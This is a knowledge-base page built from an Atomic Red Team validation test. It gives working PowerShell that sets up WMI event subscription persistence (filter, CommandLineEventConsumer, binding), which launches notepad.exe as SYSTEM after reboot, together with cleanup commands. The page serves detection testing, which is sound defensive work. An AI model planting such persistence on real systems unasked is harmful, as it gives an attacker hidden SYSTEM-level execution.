---
atomic_guid: "3c64f177-28e2-49eb-a799-d767b24dd1e0"
title: "Persistence via WMI Event Subscription - CommandLineEventConsumer"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.003"
attack_technique_name: "Event Triggered Execution: Windows Management Instrumentation Event Subscription"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.003/T1546.003.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "3c64f177-28e2-49eb-a799-d767b24dd1e0"
  - "Persistence via WMI Event Subscription - CommandLineEventConsumer"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Run from an administrator powershell window. After running, reboot the victim machine.
After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.

Code references

https://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af

https://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution#^t1546003-windows-management-instrumentation-event-subscription|T1546.003: Windows Management Instrumentation Event Subscription]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';
                CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = [Ref] $Filter;
Consumer = [Ref] $Consumer;
}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
```

### Cleanup

```powershell
$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'"
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'"
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.003/T1546.003.yaml)
